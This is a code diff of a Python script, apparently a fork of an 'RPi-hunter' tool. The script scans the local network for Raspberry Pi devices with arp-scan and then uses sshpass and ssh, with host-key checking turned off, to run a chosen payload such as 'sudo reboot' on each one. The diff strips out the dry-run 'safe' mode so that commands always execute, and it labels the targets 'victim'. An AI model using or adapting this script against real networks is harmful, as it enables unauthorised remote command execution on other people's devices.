@@ -1,12 +1,9 @@
 #!/usr/bin/python2.7
 # -*- coding: utf-8 -*-
+### ORIGINAL CODE BY BUSESCANFLY, MODIFIED BY TEAM ###
 import os
 import argparse
 from termcolor import colored, cprint
-
-main_color='yellow'
-sub_color='blue'
-line_color='red'
 
 payloads={
 	'reboot': 'sudo reboot',
@@ -22,35 +19,32 @@ def list_payloads():
 
 
 def scan(args):
-	if not args.no_scan and not args.safe:
-		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap'+quiet)
-		os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
-		os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
-		os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
-		os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
-		with open('./scan/rpi_list') as inf:
-			ip_list = [line.strip() for line in inf]
-		return ip_list
+	os.system('sudo arp-scan -g --localnet -W ./scan/scan.pcap')
+	os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
+	os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
+	os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
+	os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
+	with open('./scan/rpi_list') as inf:
+		ip_list = [line.strip() for line in inf]
+	return ip_list
 
 def rpi(ip_list, args, payload):
-	cprint('\nLoaded '+ str(len(ip_list)) + ' IP\'s', 'yellow')
+	cprint('\nLoaded '+ str(len(ip_list)) + ' IP(s)', 'yellow')
 
-	cprint("Beginning to send payload to PI\'s...", "yellow")
+	cprint("Loaded payload: " + args.payload, "green")
+	cprint("Beginning to send payload to Pi's...", "blue")
 
 	for ip in ip_list:
-		print(colored("Sending payload to", "yellow"), colored(ip, "yellow"))
-		if args.safe:
-			print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+ip+" "+payload)
-		else:
-			os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+ip+" "+payload)
-			print("\n")
+		print(colored("Sending payload to victim", "yellow"), colored(ip, "red"))
+		os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.user+"@"+ip+" "+payload)
+		print("\n")
 
-def art():
+def intro():
 		print('\n')
-		cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", main_color)
-		cprint("-----------------------------------------------------------------------------", line_color)
-		cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", sub_color)
-		cprint("-----------------------------------------------------------------------------", line_color)
+		cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", "red")
+		cprint("-----------------------------------------------------------------------------", "yellow")
+		cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", "blue")
+		cprint("-----------------------------------------------------------------------------", "yellow")
 		print('\n')
 
 def let_the_hunt_begin(args):
@@ -59,15 +53,8 @@ def let_the_hunt_begin(args):
 		payload=payloads[args.payload]
 	else:
 		payload=args.payload
-
-	global quiet
-	if args.quiet:
-		quiet=' &>/dev/null'
-	else:
-		quiet=''
     
-	if not args.quiet:
-		art()
+	intro()
 
 	if args.list:
 		list_payloads()
